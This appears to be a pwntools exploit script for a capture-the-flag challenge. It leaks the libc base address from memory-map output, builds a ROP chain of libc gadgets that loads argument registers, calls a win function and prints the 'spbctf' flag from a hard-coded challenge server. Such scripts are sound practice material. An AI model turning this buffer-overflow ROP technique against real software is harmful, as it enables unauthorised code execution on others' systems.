#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./call_fcn_rop')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11651)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
libc = ELF('libc-2.31.so')
io.recvuntil("rw-p")
io.recvline()
LIBC_base = int(io.recvline()[:12],16)
libc.address = LIBC_base


#edi=0xcafebabe esi=128 edx=127 ecx=0 r8=-1 r9=0xdeadbeef

win_fcn_addr = 0x4006D0


POP_RAX = LIBC_base + 0x000000000003ef58
POP_RDI = LIBC_base + 0x000000000002679e
POP_RSI = LIBC_base + 0x00000000000288df
POP_RDX = LIBC_base + 0x00000000000cb28d
POP_RCX_RBX = LIBC_base + 0x00000000000e4ed5 #rcx, rbx
MOV_R9_R15 = LIBC_base + 0x00000000000a9926
POP_R15 = LIBC_base + 0x000000000002679d
POP_R8_MOVE_EAX_1 = LIBC_base + 0x000000000012a976
MOV_R9_R15_CALL_RBX = LIBC_base + 0x00000000000a9926
CALL_RAX = LIBC_base + 0x0000000000026cc8
POP_RBX = LIBC_base + 0x0000000000030f6f
POP_RCX = LIBC_base + 0x000000000003b1b4

def mov_r9_val(val):
    r = p64(POP_R15)
    r += p64(val)
    r += p64(POP_RBX)
    r += p64(POP_RBX)
    r += p64(MOV_R9_R15_CALL_RBX)
    return r


pl = cyclic(40)
pl += p64(POP_RDI)
pl += p64(0xcafebabe)
pl += p64(POP_RSI)
pl += p64(0x80)
pl += p64(POP_RDX)
pl += p64(127)
pl += p64(POP_RCX_RBX)
pl += p64(0)+p64(0)
# pl += p64(XOR_RAX)
# pl += p64(PUSH_RAX) + p64(PUSH_RAX);
# pl += p64(POP_RCX_RBX) + p64()
pl += p64(POP_R8_MOVE_EAX_1)
pl += p64(0xFFFFFFFFFFFFFFFF)
pl += mov_r9_val(0xdeadbeef)
pl += p64(win_fcn_addr)
pl += p64(POP_RAX)
pl += p64(CALL_RAX)

# io.info(f"len pl = : {len(pl)}")

io.sendline(pl)


io.recvuntil("spbctf")
flag = io.recvuntil("}").decode()
log.success(f"Flag: spbctf{flag}")

# io.interactive()
io.close()
